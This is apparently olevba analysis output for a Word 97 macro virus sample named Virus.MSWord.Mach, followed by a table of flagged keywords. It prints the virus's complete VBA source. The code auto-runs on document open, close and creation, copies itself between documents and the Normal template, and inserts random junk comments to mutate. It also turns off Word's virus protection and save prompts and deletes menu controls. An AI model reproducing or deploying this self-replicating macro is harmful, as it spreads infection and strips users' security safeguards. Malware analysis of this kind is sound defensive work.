olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mach-77f7a0deac7377b1405a09898b442b08a7e14d5a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mach-77f7a0deac7377b1405a09898b442b08a7e14d5a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Copy
Documents.Save NoPrompt:=True, OriginalFormat:=wdOriginalDocumentFormat
End Sub
Private Sub Document_New()
Pos = ThisDocument.Name
If Pos = NormalTemplate.FullName Then
                                       Copy
                                       If Month(Now) = 12 Then MsgBox "In December of 1513, Niccol?Machiavelli wrote:" + vbCr + vbCr + "Virt?contro a furore" + vbCr + "Prender?l'arme, e fia el combatter corto;" + vbCr + "Ch?l'antico valore" + vbCr + "Nell'italici cor non ?ancor morto." + vbCr + vbCr + "--==<<ITALIAN PoWeR>>==--" + vbCr + vbCr + "MAD T0Y is here!", vbApplicationModal + vbInformation + vbOKOnly + vbSystemModal, "Machiavelli Word 97 Virus Version 0.1?"
End If
' PT
End Sub
Private Sub Document_Open()
On Error Resume Next
Deprotect
End Sub
Private Sub Copy()
Pos = ThisDocument.Name
If Pos = NormalTemplate.Name Then
' AKFAHMDDYREPWCUCVXKEC
' LIRIUMRUSZGOSTYJGWWMQ
' SZZGIJFS
' YGZAOIGDNLXHUXVACKVV
   Set Start = NormalTemplate.VBProject.VBComponents(1).CodeModule
' YIDZFLCBWPCNUASATWICBYHFRBO
' OOZ
   Set Target = ActiveDocument.VBProject.VBComponents(1).CodeModule
' YAKPJ
                                   Else
   Set Start = ActiveDocument.VBProject.VBComponents(1).CodeModule
   Set Target = NormalTemplate.VBProject.VBComponents(1).CodeModule
End If
' -=<CoPy>=-
' KYRZACYKZOGEZID
' LMRCAPQGJTXSHFFEH
With Start
' GFHADHQCCKFHCPDTSJDOJELQHHB
' EWCQQDHOBLBNXJXBZI
' NH
' HPKLHUIYXNHSNIPVMMFFTYDSBRD
' ALGBIOFFZSFRXEVDXZLFEBKJUFR
' CD
' BPAHOENGIWQOLVTEPBECIKRBCHM
' GPQSOAHEWNOZNPWULSFFTXDRBRC
' JUV
' STYC
' KLHUBYQGHSGIPOFMZZMRXLVKXFS
' MUDNXUPEJJILDADT
' PAUZKIXYOFIMGXBBADPSWLRRZAC
' BDQDJGPO
' QUVZLIXYORAF
' HTDQTRXZGRRWAZNVEOYVQFKKJME
' MWKMUZJQJCQBAPFOHJWJPMVUFQC
' BDRDJGPO
' JILX
    VirusCode = .Lines(1, .CountOflines)
End With
' FAHNEEYYLQWKUJWEKEDAYWHZEHF
' KOPOQJFJYEEMOQLYFBULMWKNUZJ
With Target
' XTRXEMXRWHEUVLVYBXMRRQTEHLA
' UUEFKWNBJ
' XTRXFMXRWHEUVLVYBXMRRQTEHLA
' BQYOSBF
' QTRXFNRRWIFUVLOYCXNKKJMEIMU
' CILJPYFJJOAYMNDGQUPECCBEXAD
    .DeleteLines 1, .CountOflines
' CRZPSBGAQOONQIFIYLDMOPLYMBU
' ZAINYEYREQPDUCWYKYDAJIUERNK
' AQPF
' ZMSOYPATYAZENVZNSDAQRHKUYTI
    .InsertLines 1, VirusCode
End With
' A
' JBGJHOWXHINZPDMBFPTNDABACWS
' SMLIRQBTZB
Lines = Start.CountOflines
' YNZIOIGDNLXOUXVAJJVV
Randomize Timer
' HUVRJABL
' UHHVZFTDTEOAOTQ
' UQIZ
' TC
NumberOfLines = Int(50 * Rnd) + 1
Delete$ = False
' ZZMDMEGUGMJTRCN
' NGHVZFTCTENUOMJTRCU
ReDim Position(NumberOfLines) As Long, Content(NumberOfLines) As String
' XGQNIYCCBEXUXMTSACD
For A = 1 To NumberOfLines
' NONPIEIXKDLNOKXLATRLVQMTYPP
' XFQ
' VAVUR
    Randomize Timer
    Position(A) = Int(Lines * Rnd) + 1
' PMWUFYCFDJSTDDIVL
    Content(A) = ""
    For B = 1 To 27
' CU
        Randomize Timer
' NNNPHLPXKKSNOKXLA
' ZGRLQBZOPEPSWQGLLKNZBFVAAIK
        Lettera = Int((27 * Rnd) + 64)
        If Lettera = 64 And Content(A) <> "" Then Exit For
        If Lettera = 64 And Content(A) = "" Then Lettera = Lettera + 1
        Content(A) = Content(A) + Chr$(Lettera)
' PVXEPQU
' OQLYMBASMXSNUZQQKKYBIWGWHRX
' E
' QV
' L
' CHZZSLZKQYOXQSEZYVDCOZLOMST
    Next B
' APVVCEGBOWSKBCNADKP
' IXMDBWGBXDJAAUNAMS
Next A
For A = 1 To NumberOfLines
    If Left$(VBE.SelectedVBComponent.CodeModule.Lines(A, 1), 1) = "'" Then
' KRRZABYKSOGXZIXZGLWCWPCONBS
       VBE.SelectedVBComponent.CodeModule.DeleteLines A, 1
       DeleteBol = True
' XWZRORGUMVXYUGVKC
' A
' TZ
       Delete = Delete + 1
' U
' MZHNHGCMKWOTWU
       If Delete > NumberOfLines Then Exit For
' JCRBAPFPHJXJPMWUFQCZXCLSDXB
' OEGQEGOTDKDXKWVJ
    End If
Next A
' OFGRFHOMDKYYLPWJUJVEREKGQHT
' RHLMLNGCGWBBJLNIVCZRIJUHKRW
' XCKSCXBNK
' JUGJHNPXHHMSPDLVEOLGWAAACVS
' LTCNXUOEIIIKC
' WQAWRYCUUOHVFMTKTLNAVTQ
' KSOGYZJX
If DeleteBol = False Then
   For A = 1 To NumberOfLines
       VBE.SelectedVBComponent.CodeModule.InsertLines Position(A), "' " + Content(A)
' VBASZLLZDJYHXJSESYVDVGZZB
   Next A
End If
End Sub
Private Sub Deprotect()
Options.VirusProtection = False
Options.SaveNormalPrompt = False
CommandBars("Tools").Controls(12).Delete
CommandBars("Tools").Controls(14).Delete
CommandBars("Format").Controls(12).Delete
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

